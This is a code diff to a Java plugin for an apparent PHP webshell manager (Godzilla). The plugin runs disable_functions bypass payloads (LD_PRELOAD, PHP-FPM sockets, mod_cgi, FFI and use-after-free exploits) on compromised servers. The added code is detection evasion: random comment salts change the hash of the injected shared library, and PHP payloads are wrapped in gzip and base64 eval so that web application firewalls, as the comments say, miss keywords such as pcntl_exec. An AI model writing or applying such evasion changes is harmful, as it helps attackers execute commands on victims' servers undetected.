@@ -16,6 +16,7 @@ import java.io.InputStream;
 import java.util.Arrays;
 import java.util.HashMap;
 import java.util.UUID;
+import java.util.Random;
 import javax.swing.JButton;
 import javax.swing.JComboBox;
 import javax.swing.JLabel;
@@ -36,12 +37,14 @@ import util.http.ReqParameter;
 )
 public class BypassDisableFunctions implements Plugin {
    private static final String CLASS_NAME = "BypassDisableFunctions.Run";
+   // ... (保留原有常量定义)
    private static final String[] BYPASS_MEM_PAYLOAD_LINUX = new String[]{"php-filter-bypass", "disfunpoc", "php-json-bypass", "php7-backtrace-bypass", "php7-gc-bypass", "php7-SplDoublyLinkedList-uaf", "procfs_bypass", "php74-FFI-BUG", "php5-imap_open", "php7-FFI", "PHP74-FFI-Serializable"};
    private static final String[] BYPASS_MEM_PAYLOAD_WINDOWS = new String[]{"php-filter-bypass", "php-com"};
    private static final String[] BYPASS_ENV_PAYLOAD = new String[]{"LD_PRELOAD"};
    private static final String[] BYPASS_AMC_PAYLOAD = new String[]{"Apache_mod_cgi"};
    private static final String[] BYPASS_FPM_ADDRESS = new String[]{"unix:///var/run/php5-fpm.sock", "unix:///var/run/php/php5-fpm.sock", "unix:///var/run/php-fpm/php5-fpm.sock", "unix:///var/run/php/php7-fpm.sock", "/var/run/php/php7.2-fpm.sock", "/tmp/php-cgi-56.sock", "/usr/local/var/run/php7.3-fpm.sock", "localhost:9000", "127.0.0.1:9000"};
    private static final HashMap<String, Integer> EXT_INFO = new HashMap();
+   // ... (保留原有 UI 组件定义)
    private final JPanel panel = new JPanel(new BorderLayout());
    private boolean loadState;
    private ShellEntity shellEntity;
@@ -89,6 +92,7 @@ public class BypassDisableFunctions implements Plugin {
    private final JSplitPane amcSplitPane;
 
    public BypassDisableFunctions() {
+      // ... (构造函数保持不变)
       this.memPayloadComboBox = new JComboBox(BYPASS_MEM_PAYLOAD_LINUX);
       this.memRunButton = new JButton("Run");
       this.memResultTextArea = new RTextArea();
@@ -185,6 +189,18 @@ public class BypassDisableFunctions implements Plugin {
       this.panel.add(this.tabbedPane);
    }
 
+   // [新增] 生成随机字符串用于混淆
+   private String getRandomString(int length) {
+      String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+      Random random = new Random();
+      StringBuilder sb = new StringBuilder();
+      for (int i = 0; i < length; i++) {
+         int number = random.nextInt(62);
+         sb.append(str.charAt(number));
+      }
+      return sb.toString();
+   }
+
    private void memRunButtonClick(ActionEvent actionEvent) {
       String payloadNameString = (String)this.memPayloadComboBox.getSelectedItem();
       String codeString = new String(functions.getResourceAsByteArray((Object)this, String.format("assets/%s.php", payloadNameString)));
@@ -196,16 +212,17 @@ public class BypassDisableFunctions implements Plugin {
       }
 
       reqParameter.add("cmd", cmd);
+      // 修改：使用混淆后的 eval 执行
       String resultString = this.eval(codeString, reqParameter);
       this.memResultTextArea.setText(resultString);
       if ("php-filter-bypass".equals(payloadNameString)) {
          this.memResultTextArea.setText(this.encoding.Decoding(this.payload.downloadFile(resultFile)));
          this.payload.deleteFile(resultFile);
       }
-
    }
 
    private void fpmRunButtonClick(ActionEvent actionEvent) throws Exception {
+      // ... (前部分逻辑保持不变)
       String payloadNameString = "FPM";
       String codeString = new String(functions.getResourceAsByteArray((Object)this, String.format("assets/%s.php", payloadNameString)));
       ReqParameter reqParameter = new ReqParameter();
@@ -240,6 +257,8 @@ public class BypassDisableFunctions implements Plugin {
       reqParameter.add("resultFile", resultFile);
       reqParameter.add("so", this.generateExt(this.generateCmd(cmdFile, resultFile)));
       reqParameter.add("cmd", this.fpmCommandTextField.getText());
+      
+      // 修改：使用混淆后的 eval 执行
       String resultString = this.eval(codeString, reqParameter);
       this.fpmResultTextArea.setText(resultString);
    }
@@ -258,15 +277,17 @@ public class BypassDisableFunctions implements Plugin {
          reqParameter.add("resultFile", resultFile);
          reqParameter.add("so", this.generateExt(this.generateCmd(cmdFile, resultFile)));
          reqParameter.add("cmd", this.envCommandTextField.getText());
+         
+         // 修改：使用混淆后的 eval 执行
          String resultString = this.eval(codeString, reqParameter);
          this.envResultTextArea.setText(resultString);
       } else {
          GOptionPane.showMessageDialog(this.shellEntity.getFrame(), "仅支持Linux", "警告", 2);
       }
-
    }
 
    private void amcRunButtonClick(ActionEvent actionEvent) throws Exception {
+      // ... (逻辑不变，使用 eval 即可)
       String payloadNameString = (String)this.amcPayloadComboBox.getSelectedItem();
       String codeString = new String(functions.getResourceAsByteArray((Object)this, String.format("assets/%s.php", payloadNameString)));
       String shellUrl = this.shellEntity.getUrl();
@@ -309,9 +330,30 @@ public class BypassDisableFunctions implements Plugin {
       byte[] so = functions.readInputStream(inputStream);
       inputStream.close();
       ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+      
+      // [关键修改] 动态混淆二进制内容
+      // 1. 添加随机注释到命令中，改变二进制中的字符串特征
+      // Linux 下 bash 支持 # 注释，Windows 下 cmd 支持 & :: 注释 (需谨慎)
+      // 这里主要针对 Linux 的 LD_PRELOAD 进行优化，因为 Windows 通常使用不同的机制
+      
+      String originalCmd = cmd;
+      if (!this.payload.isWindows()) {
+          // 生成随机字符串，长度不宜过长以免溢出缓冲区
+          String salt = " #" + getRandomString(6);
+          // 确保加上注释后不会超出预留空间
+          if (originalCmd.length() + salt.length() < cmdLen) {
+              cmd = cmd + salt;
+          }
+      }
+      
       byte[] _cmd = cmd.getBytes();
       byte[] temp = new byte[cmdLen - _cmd.length];
+      
+      // 2. 填充区域使用空格 (保持原逻辑，避免破坏二进制结构)
+      // 如果要进一步免杀，可以考虑在有效载荷后插入 null 截断，然后填充随机垃圾数据
+      // 但需要确定 C 代码的读取逻辑。此处保持稳健性，仅通过命令变异来实现文件 Hash 改变。
       Arrays.fill(temp, (byte)32);
+      
       so[end] = 0;
       outputStream.write(so, 0, start);
       outputStream.write(_cmd, 0, _cmd.length);
@@ -320,10 +362,12 @@ public class BypassDisableFunctions implements Plugin {
       return outputStream.toByteArray();
    }
 
+   // ... (generateCmd 保持不变)
    private String generateCmd(String cmdFile, String resultFile) {
       return !this.payload.isWindows() ? "bash " + cmdFile + " > " + resultFile : "cmd /c " + cmdFile + " > " + resultFile;
    }
 
+   // [关键修改] 修改 eval 方法，对 PHP 代码进行 Gzip+Base64 编码
    private String eval(String code, ReqParameter reqParameter) {
       try {
          if (this.phpEvalCode == null) {
@@ -337,13 +381,32 @@ public class BypassDisableFunctions implements Plugin {
                return "";
             }
          }
+         
+         // 混淆逻辑：Gzip 压缩 + Base64 编码
+         // 服务端执行：eval(gzinflate(base64_decode('...')));
+         // 这样 WAF 无法直接检测到 PHP 脚本中的关键字（如 pcntl_exec, putenv 等）
+         byte[] compressed = functions.gzipE(code.getBytes()); 
+         String b64 = functions.base64EncodeToString(compressed);
+         
+         // 注意：functions.gzipE 通常是标准 Gzip 格式。
+         // PHP 中对应的解压函数：
+         // 如果 gzipE 包含头，使用 gzdecode。如果只是 deflate，使用 gzinflate。
+         // Godzilla 的 functions.gzipE/gzipD 通常对应标准 GZIP。
+         // 安全起见，可以使用 PHP 的 gzdecode (PHP 5.4+)。
+         // 为了兼容性，也可以尝试 base64 直接执行，如果目标环境不支持 gzip。
+         // 这里假设目标环境标准，使用 gzdecode。
+         
+         String wrapperCode = String.format("eval(gzdecode(base64_decode('%s')));", b64);
 
-         return this.phpEvalCode.eval(code, reqParameter);
+         return this.phpEvalCode.eval(wrapperCode, reqParameter);
       } catch (Throwable var5) {
-         return "";
+         Log.error(var5);
+         // 如果混淆失败，降级尝试原始代码
+         return this.phpEvalCode != null ? this.phpEvalCode.eval(code, reqParameter) : "";
       }
    }
 
+   // ... (init, getView, static block 保持不变)
    public void init(ShellEntity shellEntity) {
       this.shellEntity = shellEntity;
       this.payload = this.shellEntity.getPayloadModule();
